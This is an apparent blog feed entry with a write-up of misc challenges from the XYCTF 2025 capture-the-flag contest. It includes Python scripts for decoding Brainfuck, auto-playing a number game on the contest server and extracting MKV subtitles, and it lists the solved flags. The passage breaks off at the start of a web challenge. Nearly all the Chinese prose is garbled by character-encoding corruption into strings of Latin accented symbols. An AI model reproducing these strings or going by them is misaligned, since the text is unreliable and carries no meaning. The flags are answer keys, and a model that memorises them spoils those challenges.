  
  <entry>
    <title>XYCTF2025wp</title>
    <link href="https://blog.m3x1.cn/posts/5d3935ce.html"/>
    <id>https://blog.m3x1.cn/posts/5d3935ce.html</id>
    <published>2025-04-13T16:00:00.000Z</published>
    <updated>2025-04-14T04:00:39.253Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="misc">misc</h2><h3 id="XGCTF">XGCTF</h3><p>æ ¹æ®é¢˜ç›®æè¿°</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250405191413371.png" alt="image-20250405191413371"></p><p>å¯ä»¥çŸ¥é“ï¼Œéœ€è¦æ‰¾åˆ°XGCTFä¸­LamentXUå¸ˆå‚…å‡ºçš„é¢˜</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250405191521846.png" alt="image-20250405191521846"></p><p>è¿™é“é¢˜æ˜¯åŸå‹é“¾æ±¡æŸ“çš„é¢˜ç›®</p><p>ç„¶åä½¿ç”¨æµè§ˆå™¨æœç´¢å¼•æ“æ‰¾åˆ°dragonkeepçš„åšå®¢ï¼ˆç»“åˆæç¤ºæ¨æ–­ï¼Œä¼šå¤šä¸€ä¸ªå­—æ¯ï¼‰</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250405191707025.png" alt="image-20250405191707025"></p><p>ç„¶åè¿›å»æ‰¾åˆ°æœ‰å…³åŸå‹é“¾æ±¡æŸ“çš„é¢˜ç›®ï¼Œè¿›å…¥é¡µé¢ï¼ŒæŸ¥çœ‹æºç ï¼Œåœ¨æºç å¤„æ‰¾åˆ°flagçš„base64ç¼–ç ï¼Œç„¶åè§£ç å°±å¾—åˆ°flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250405191834120.png" alt="image-20250405191834120"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250405191844361.png" alt="image-20250405191844361"></p><blockquote><p>flag{1t_I3_t3E_s@Me_ChAl1eNge_aT_a1L_P1e@se_fOrg1ve_Me}</p></blockquote><h3 id="ç­¾ä¸ªåˆ°å§">ç­¾ä¸ªåˆ°å§</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406004256018.png" alt="image-20250406004256018"></p><p>æ ¹æ®é¢˜ç›®æç¤ºï¼š</p><blockquote><p>æœ€å°çš„ï¼Œå…·æœ‰å›¾çµå®Œå¤‡æ€§çš„è¯­è¨€æ˜¯ï¼Ÿ</p></blockquote><p>å’Œä¸Šç½‘æŸ¥è¯¢ï¼Œå‘ç°æ˜¯Brainfuckä»£ç </p><p>æŸ¥è¯¢å…¶çŸ¥è¯†ç‚¹å¯ä»¥çŸ¥é“ï¼Œå…¶è®¡ç®—æ–¹æ³•å¤§æ¦‚å°±æ˜¯å‰é¢çš„+æ•°é‡å’Œ[&lt;&gt;]é‡Œçš„+æ•°é‡ç›¸ä¹˜ï¼Œå¾—åˆ°ä¸€ä¸ªæ•°ï¼Œå°±æ˜¯ä¸€ä¸ªascllç ï¼Œè¿™æ®µä»£ç æ— æ³•ç›´æ¥è¿è¡Œï¼Œæ‰€ä»¥å°†å…¶è¿›è¡Œä¿®æ”¹ï¼Œå»æ‰â€-Â±Â±Â±â€å’Œ&quot;&lt;[-]&gt;&quot;ï¼Œç„¶åå°±æ˜¯è¿™ä¸ªæ ·å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+++++++++++++++++[&lt;++++++&gt;]++++++++++++[&lt;+++++++++&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;]+++++++++++++++++++++++++++++++++++++++++[&lt;+++&gt;]+++++++++++++++++++++++++++++[&lt;+++&gt;]+++++++++++++++++[&lt;+++&gt;]++++++++++++[&lt;+++++++++&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;]++++++++[&lt;++++++&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;]+++++++++++++++++++[&lt;+++++&gt;]+++++++++++++++++++++++++++++[&lt;++++&gt;]++++++++[&lt;++++++&gt;]+++++++++++++++++++[&lt;+++++&gt;]+++++++++++[&lt;++++++++&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;]++++++++++++[&lt;+++++++&gt;]++++++++++[&lt;+++++++&gt;]+++++++++++++++++++[&lt;+++++&gt;]++++++++++[&lt;+++++&gt;]++++++++[&lt;++++++&gt;]++++++++++[&lt;+++++&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;]+++++++++++++++++++[&lt;+++++&gt;]+++++++++++++++++++++++[&lt;+++&gt;]+++++++++++[&lt;++++++++++&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;++&gt;]++++++++[&lt;++++++&gt;]+++++++++++[&lt;+++++&gt;]+++++++++++++++++++[&lt;+++++&gt;]+++++++[&lt;+++++++&gt;]+++++++++++++++++++++++++++++[&lt;++++&gt;]+++++++++++[&lt;+++&gt;]+++++++++++++++++++++++++[&lt;+++++&gt;]</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨pythonè„šæœ¬è·‘ä¸€ä¸‹å¾—åˆ°ascllç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">s = &#x27;+++++++++++++++++[&lt;++++++&gt;]++++++++++++[&lt;+++++++++&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;]+++++++++++++++++++++++++++++++++++++++++[&lt;+++&gt;]+++++++++++++++++++++++++++++[&lt;+++&gt;]+++++++++++++++++[&lt;+++&gt;]++++++++++++[&lt;+++++++++&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;]++++++++[&lt;++++++&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;]+++++++++++++++++++[&lt;+++++&gt;]+++++++++++++++++++++++++++++[&lt;++++&gt;]++++++++[&lt;++++++&gt;]+++++++++++++++++++[&lt;+++++&gt;]+++++++++++[&lt;++++++++&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;]++++++++++++[&lt;+++++++&gt;]++++++++++[&lt;+++++++&gt;]+++++++++++++++++++[&lt;+++++&gt;]++++++++++[&lt;+++++&gt;]++++++++[&lt;++++++&gt;]++++++++++[&lt;+++++&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;]+++++++++++++++++++[&lt;+++++&gt;]+++++++++++++++++++++++[&lt;+++&gt;]+++++++++++[&lt;++++++++++&gt;]+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;++&gt;]++++++++[&lt;++++++&gt;]+++++++++++[&lt;+++++&gt;]+++++++++++++++++++[&lt;+++++&gt;]+++++++[&lt;+++++++&gt;]+++++++++++++++++++++++++++++[&lt;++++&gt;]+++++++++++[&lt;+++&gt;]+++++++++++++++++++++++++[&lt;+++++&gt;]&#x27;</span><br><span class="line"></span><br><span class="line">results = []</span><br><span class="line">i = 0</span><br><span class="line">n = len(s)</span><br><span class="line"></span><br><span class="line">while i &lt; n:</span><br><span class="line">    # æ”¶é›†å‰é¢çš„åŠ å·</span><br><span class="line">    count_plus = 0</span><br><span class="line">    while i &lt; n and s[i] == &#x27;+&#x27;:</span><br><span class="line">        count_plus += 1</span><br><span class="line">        i += 1</span><br><span class="line">    if count_plus == 0:</span><br><span class="line">        # æ²¡æœ‰åŠ å·ï¼Œè·³è¿‡å½“å‰å­—ç¬¦</span><br><span class="line">        i += 1</span><br><span class="line">        continue</span><br><span class="line">    # æ£€æŸ¥æ˜¯å¦æœ‰å·¦æ‹¬å·</span><br><span class="line">    if i &gt;= n or s[i] != &#x27;[&#x27;:</span><br><span class="line">        continue  # ç»“æ„ä¸ç¬¦åˆï¼Œè·³è¿‡</span><br><span class="line">    i += 1  # è·³è¿‡å·¦æ‹¬å·</span><br><span class="line">    bracket_plus = 0</span><br><span class="line">    count_bracket = 1</span><br><span class="line">    # å¤„ç†æ‹¬å·å†…çš„å†…å®¹</span><br><span class="line">    while i &lt; n and count_bracket != 0:</span><br><span class="line">        if s[i] == &#x27;[&#x27;:</span><br><span class="line">            count_bracket += 1</span><br><span class="line">        elif s[i] == &#x27;]&#x27;:</span><br><span class="line">            count_bracket -= 1</span><br><span class="line">        if s[i] == &#x27;+&#x27;:</span><br><span class="line">            bracket_plus += 1</span><br><span class="line">        i += 1</span><br><span class="line">    # è®¡ç®—å¹¶å­˜å‚¨ç»“æœ</span><br><span class="line">    product = count_plus * bracket_plus</span><br><span class="line">    results.append(product)</span><br><span class="line"></span><br><span class="line"># è¾“å‡ºæ‰€æœ‰ç»“æœ</span><br><span class="line">for num in results:</span><br><span class="line">    print(num, end=&#x27; &#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406004736659.png" alt="image-20250406004736659"></p><p>è§£ç å¾—åˆ°flag</p><blockquote><p>flag{W3lC0me_t0_XYCTF_2025_Enj07_1t!}</p></blockquote><h3 id="ä¼šé£çš„é›·å…‹è¨æ–¯">ä¼šé£çš„é›·å…‹è¨æ–¯</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406172048920.png" alt="image-20250406172048920"></p><p>æ ¹æ®é¢˜ç›®å†…å®¹æœç´¢å…³é”®è¯ï¼š1.30ä¸€ç”·å­©æ”¾é­ç‚®å¼•çˆ†åœ°é¢</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406172203061.png" alt="image-20250406172203061"></p><p>ç„¶åå†ç›´æ¥æœç´¢â¼©ä¸œâ¼—ä¸ƒâ»”åº—ç”µè¯5951557æ‰¾åˆ°â¼¤æ¦‚ä½ç½®</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250414100626967.png" alt="image-20250414100626967"></p><blockquote><p>flag{å››å·çœå†…æ±Ÿå¸‚èµ„ä¸­å¿æ˜¥å²šåŒ—è·¯ä¸­é“åŸå¸‚ä¸­å¿ƒå†…}</p></blockquote><h3 id="Greedymen">Greedymen</h3><p>å¼€å¯ç¯å¢ƒï¼Œç„¶åçœ‹çœ‹æ˜¯ä¸ªæ¸¸æˆï¼Œæ¸¸æˆè§„åˆ™å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406183320540.png" alt="image-20250406183320540"></p><p>ç¿»è¯‘è¿‡æ¥å°±æ˜¯ï¼š</p><blockquote><p>å…±æœ‰ 3 ä¸ªçº§åˆ«ï¼Œ1/2/3 çº§æœ‰æ•°å­— 1 åˆ° 50/100/200 å¯ä¾›é€‰æ‹©<br>æ‚¨é€‰æ‹©çš„æ¯ä¸ªæ•°å­—ï¼Œæ‚¨éƒ½ä¼šè·å¾—ç›¸åº”çš„ç§¯åˆ†<br>ä¸è¿‡ï¼Œæ‚¨çš„å¯¹æ‰‹ä¼šé€‰æ‹©æ‚¨æ‰€é€‰æ‹©çš„æ•°å­—çš„æ‰€æœ‰å› ç´ ï¼Œå¹¶å¾—åˆ°æ¯ä¸ªå› ç´ çš„åˆ†æ•°<br>æ‚¨ä¸èƒ½é€‰æ‹©å·²åˆ†é…ç»™ç©å®¶çš„å·ç <br>åªæœ‰å½“è¯¥æ•°å­—è‡³å°‘æœ‰ä¸€ä¸ªå› ç´ æœªé€‰æ‹©æ—¶ï¼Œæ‚¨æ‰å…è®¸é€‰æ‹©è¯¥æ•°å­—<br>å¦‚æœæ‚¨ä¸èƒ½å†é€‰æ‹©ï¼Œåˆ™æ£‹ç›˜çš„å…¶ä½™éƒ¨åˆ†å½’æ‚¨çš„å¯¹æ‰‹æ‰€æœ‰<br>ä¸ºäº†è®©æŒ‘æˆ˜æ›´éš¾ï¼Œåœ¨ 1/2/3 çº§ä¸­æœ‰ä¸€ä¸ªä»¥ 19/37/76 å¼€å¤´çš„è®¡æ•°å™¨ï¼Œæ¯é€‰æ‹©ä¸€ä¸ªæ•°å­—ï¼Œè®¡æ•°å™¨å°±ä¼šå‡å°‘ 1<br>å½“æ•°å€¼è¾¾åˆ° 0 æ—¶ï¼Œæ¸¸æˆå°±ä¼šç»“æŸï¼Œè€Œæœªåˆ†é…çš„æ•°å­—ä¼šå½’æ‚¨çš„å¯¹æ‰‹æ‰€æœ‰<br>æŒ‘æˆ˜æ€»æ˜¯å¯ä»¥è§£å†³çš„<br>å¾—åˆ†æœ€é«˜çš„ç©å®¶è·èƒœ<br>ç¥ä½ å¥½è¿ï¼</p></blockquote><p>å°±æ˜¯ä¸ªçƒ§è„‘æ¸¸æˆï¼Œå…·ä½“ç©æ³•æ€ä¹ˆèµ¢å°±ä¸è¯´äº†ï¼Œç›´æ¥ä¸Šè„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">from pwn import *</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import math</span><br><span class="line"></span><br><span class="line">HOST = &quot;47.94.172.18&quot;</span><br><span class="line">PORT = 28866</span><br><span class="line">def get_proper_divisors(n):</span><br><span class="line">    divs = set()</span><br><span class="line">    for i in range(1, int(math.sqrt(n)) + 1):</span><br><span class="line">        if n % i == 0:</span><br><span class="line">            if i != n:</span><br><span class="line">                divs.add(i)</span><br><span class="line">            j = n // i</span><br><span class="line">            if j != n:</span><br><span class="line">                divs.add(j)</span><br><span class="line">    return sorted(divs)</span><br><span class="line"></span><br><span class="line">def parse_unassigned(line):</span><br><span class="line">    m = re.search(r&#x27;Unassigned Numbers: \[(.*?)\]&#x27;, line)</span><br><span class="line">    if m:</span><br><span class="line">        nums = m.group(1).split(&#x27;,&#x27;)</span><br><span class="line">        nums = [int(x.strip()) for x in nums if x.strip() != &#x27;&#x27;]</span><br><span class="line">        return nums</span><br><span class="line">    return []</span><br><span class="line"></span><br><span class="line">def parse_info(line):</span><br><span class="line">    m = re.search(r&#x27;Counter: (\d+)&#x27;, line)</span><br><span class="line">    if m:</span><br><span class="line">        counter = int(m.group(1))</span><br><span class="line">    else:</span><br><span class="line">        counter = None</span><br><span class="line">    m2 = re.search(r&#x27;Your Score: (\d+)&#x27;, line)</span><br><span class="line">    if m2:</span><br><span class="line">        your_score = int(m2.group(1))</span><br><span class="line">    else:</span><br><span class="line">        your_score = None</span><br><span class="line">    m3 = re.search(r&#x27;Opponent Score: (\d+)&#x27;, line)</span><br><span class="line">    if m3:</span><br><span class="line">        opp_score = int(m3.group(1))</span><br><span class="line">    else:</span><br><span class="line">        opp_score = None</span><br><span class="line">    return counter, your_score, opp_score</span><br><span class="line"></span><br><span class="line">def choose_number(unassigned):</span><br><span class="line">    best = None</span><br><span class="line">    best_net = -10**9</span><br><span class="line"></span><br><span class="line">    max_value = max(unassigned) if unassigned else 50</span><br><span class="line">    assigned = set(range(1, max_value + 1)) - set(unassigned)</span><br><span class="line">    </span><br><span class="line">    for n in unassigned:</span><br><span class="line">        divisors = get_proper_divisors(n)</span><br><span class="line">        legal = False</span><br><span class="line">        gain_loss = 0</span><br><span class="line">        for d in divisors:</span><br><span class="line">            if d in unassigned:</span><br><span class="line">                legal = True</span><br><span class="line">                gain_loss += d </span><br><span class="line">        if not legal:</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        net = n - gain_loss</span><br><span class="line">        if net &gt; best_net:</span><br><span class="line">            best_net = net</span><br><span class="line">            best = n</span><br><span class="line">    return best</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    context.log_level = &quot;info&quot;</span><br><span class="line">    io = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">    banner = io.recvuntil(b&quot;1.Play&quot;)</span><br><span class="line">    log.info(&quot;Banner:\n&quot; + banner.decode())</span><br><span class="line"></span><br><span class="line">    io.sendline(b&quot;1&quot;)</span><br><span class="line">    </span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            data = io.recvuntil(b&quot;Choose a Number:&quot;, timeout=10)</span><br><span class="line">        except EOFError:</span><br><span class="line">            log.info(&quot;æ¸¸æˆç»“æŸ&quot;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        text = data.decode()</span><br><span class="line">        log.info(&quot;å½“å‰çŠ¶æ€:\n&quot; + text)</span><br><span class="line">        </span><br><span class="line">        unassigned = []</span><br><span class="line">        for line in text.splitlines():</span><br><span class="line">            if &quot;Unassigned Numbers:&quot; in line:</span><br><span class="line">                unassigned = parse_unassigned(line)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">        if not unassigned:</span><br><span class="line">            log.info(&quot;æ— æ³•è§£ææœªåˆ†é…æ•°å­—æˆ–åˆ—è¡¨ä¸ºç©ºï¼Œé€€å‡º&quot;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        choice = choose_number(unassigned)</span><br><span class="line">        if choice is None:</span><br><span class="line">            log.info(&quot;æ²¡æœ‰åˆæ³•é€‰é¡¹ï¼Œé€€å‡º&quot;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        log.info(&quot;é€‰æ‹©æ•°å­—: &#123;&#125;&quot;.format(choice))</span><br><span class="line">        io.sendline(str(choice).encode())</span><br><span class="line"></span><br><span class="line">        time.sleep(0.5)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>ç­‰è„šæœ¬è·‘å®Œå¾—åˆ°flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406183721640.png" alt="image-20250406183721640"></p><blockquote><p>flag{Greed, isâ€¦key of the life.}</p></blockquote><h3 id="MADerä¹Ÿè¦å½“CTFer">MADerä¹Ÿè¦å½“CTFer</h3><p>æ‰“å¼€é™„ä»¶æ˜¯ä¸€ä¸ªmkvéŸ³é¢‘æ–‡ä»¶ï¼Œè€Œä¸”æ˜¯bilibiliä¸Šçš„ï¼Œæ˜¾ç¤ºæœ‰5åˆ†å¤šé’Ÿï¼Œä½†æ˜¯åªèƒ½æ’­æ”¾ä¸€ç‚¹ã€‚</p><p>ç„¶åå»bilibiliä¸Šæ‰¾åŸè§†é¢‘ï¼Œå‘ç°åªæœ‰åå‡ ç§’</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406185545579.png" alt="image-20250406185545579"></p><p>å…ˆç”¨å·¥å…·PotPlayeræ‰“å¼€çœ‹çœ‹ï¼Œå‘ç°åº•ä¸‹æœ‰ä¸€å †å­—å¹•æµ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406185741934.png" alt="image-20250406185741934"></p><p>äºæ˜¯ä½¿ç”¨å·¥å…·mkvextractGUIå¯¼å‡ºå­—å¹•æµ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406192727530.png" alt="image-20250406192727530"></p><p>ç„¶åä½¿ç”¨è„šæœ¬å¤„ç†ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">def extract_ass_text(input_file, output_file):</span><br><span class="line">    try:</span><br><span class="line">        with open(input_file, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">            ass_content = f.readlines()</span><br><span class="line">    except UnicodeDecodeError:</span><br><span class="line">        with open(input_file, &#x27;r&#x27;, encoding=&#x27;gbk&#x27;) as f:</span><br><span class="line">            ass_content = f.readlines()</span><br><span class="line">    dialogues = [] # è¿™ä¸ªåˆ—è¡¨ç°åœ¨æ˜¯å‡½æ•°çš„å±€éƒ¨å˜é‡</span><br><span class="line">    for line in ass_content:</span><br><span class="line">        line = line.strip()</span><br><span class="line">        if line.startswith(&#x27;Dialogue:&#x27;):</span><br><span class="line">            parts = line.split(&#x27;,&#x27;, 9)</span><br><span class="line">            if len(parts) &lt; 10:</span><br><span class="line">                continue</span><br><span class="line">            text = parts[9]</span><br><span class="line">            text = re.sub(r&#x27;\&#123;.*?\&#125;&#x27;, &#x27;&#x27;, text)</span><br><span class="line">            text = re.sub(r&#x27;\\[nNhH]&#x27;, &#x27; &#x27;, text)</span><br><span class="line">            text = text.strip()</span><br><span class="line">            if text:</span><br><span class="line">                dialogues.append(text)</span><br><span class="line">    with open(output_file, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">        f.write(&#x27;\n&#x27;.join(dialogues))</span><br><span class="line">    return dialogues # æ·»åŠ è¿”å›å€¼</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    input_path = &#x27;C:\\Users\\Lucky\\Desktop\\competition\\xyctf2025\\misc\\MADerä¹Ÿè¦å½“CTFer\\åªæ˜¯åˆšå¥½æƒ…çª¦åˆå¼€é‡åˆ°ä½ .ass&#x27;</span><br><span class="line">    output_path = &#x27;C:\\Users\\Lucky\\Desktop\\competition\\xyctf2025\\misc\\MADerä¹Ÿè¦å½“CTFer\\1.txt&#x27;</span><br><span class="line">    dialogues = extract_ass_text(input_path, output_path) # æ¥æ”¶è¿”å›å€¼</span><br><span class="line">    print(f&#x27;æˆåŠŸæå– &#123;len(dialogues)&#125; æ¡å­—å¹•åˆ° &#123;output_path&#125;&#x27;)</span><br></pre></td></tr></table></figure><p>ç„¶åå°†â¼—å…­è¿›åˆ¶è§£ç å¾—åˆ°â¼€ä¸ªâ½‚ä»¶</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406201019876.png" alt="image-20250406201019876"></p><p>ç„¶åè®°äº‹æœ¬æ‰“å¼€æ‰¾flagï¼Œéœ€è¦è´¹çœ¼ç›å’Œä¸€äº›ç»éªŒã€‚</p><p>ç»†å¯»æ‰¾æ‰¾åˆ°äº†flagã€‚</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406200941068.png" alt="image-20250406200941068"></p><blockquote><p>flag{l_re@IIy_w@nn@_2_Ie@rn_AE}</p></blockquote><h3 id="æ›¼æ³¢æ›¼æ³¢æ›¼æ³¢">æ›¼æ³¢æ›¼æ³¢æ›¼æ³¢</h3><p>ä¸‹è½½é™„ä»¶æ˜¯ä¸€ä¸ªäºŒç»´ç å’Œä¸€ä¸ªtxtæ–‡ä»¶ï¼Œæ‰«æäºŒç»´ç å‘ç°æ˜¯ä¸ªå‡çš„flagï¼Œäºæ˜¯å°†ç›®å…‰è½¬å‘txtæ–‡æœ¬ã€‚</p><p>æŸ¥çœ‹æ–‡æœ¬å†…å®¹ï¼Œå‘ç°å¼€å¤´æ˜¯ä¸ª=</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250414105912957.png" alt="image-20250414105912957"></p><p>æƒ³åˆ°å¯èƒ½æ˜¯base64çš„é€†åºï¼Œäºæ˜¯ä½¿ç”¨è„šæœ¬æˆ–è€…åœ¨çº¿ç½‘ç«™å°†å…¶é€†åºå›æ¥ï¼Œå¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ã€‚</p><p>è§£å‹å¾—åˆ°</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250414110039835.png" alt="image-20250414110039835"></p><p>æ ¹æ®æç¤ºï¼Œè¯•è¯•å¯†ç ï¼šxyctf2025ï¼Œé”™è¯¯ã€‚</p><p>è¯•è¯•å¤§å†™ï¼šXYCTF2025ï¼ŒæˆåŠŸæå–å†…å®¹</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250414110257927.png" alt="image-20250414110257927"></p><p>ç°åœ¨åŠ ä¸Šå®ƒåŸæœ¬ç»™çš„å›¾ç‰‡ï¼Œæœ‰ä¸¤å¼ çœ‹ç€ä¸€æ ·çš„å›¾ç‰‡äº†</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250414110732935.png" alt="image-20250414110732935"></p><p>åŒå›¾ç‰‡ç›²æ°´å°ç›´æ¥æå–</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250414111934085.png" alt="image-20250414111934085"></p><blockquote><p>XYCTF{easy_yin_xie_dfbfuj877}</p></blockquote><h3 id="é—®å·">é—®å·</h3><p>å°±ä¸å¤šè¯´äº†ã€‚å¡«äº†å°±è¡Œ</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250406162827583.png" alt="image-20250406162827583"></p><h2 id="web">web</h2><h3 id="Signin">Signin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 